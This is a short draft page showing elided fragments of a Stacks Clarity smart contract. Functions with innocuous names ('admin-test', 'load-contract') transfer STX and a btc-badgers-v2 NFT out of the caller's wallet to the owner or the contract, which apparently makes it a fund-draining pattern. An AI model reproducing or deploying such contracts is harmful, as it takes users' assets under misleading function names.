---
title: "Trait intensive-brown-whale"
draft: true
---
```
...
(define-public (admin-test)
  (begin
    ...
    (unwrap! (stx-transfer? u10000 tx-sender contract-owner) (err u102))
    (ok
...
(define-public (load-contract)
  (ok
    (unwrap!  (contract-call? 'SP27F9EJH20K3GT6GHZG0RD08REZKY2TDMD6D9M2Z.btc-badgers-v2 transfer u80 tx-sender (as-contract tx-sender)) (err u104))
  )
)
```
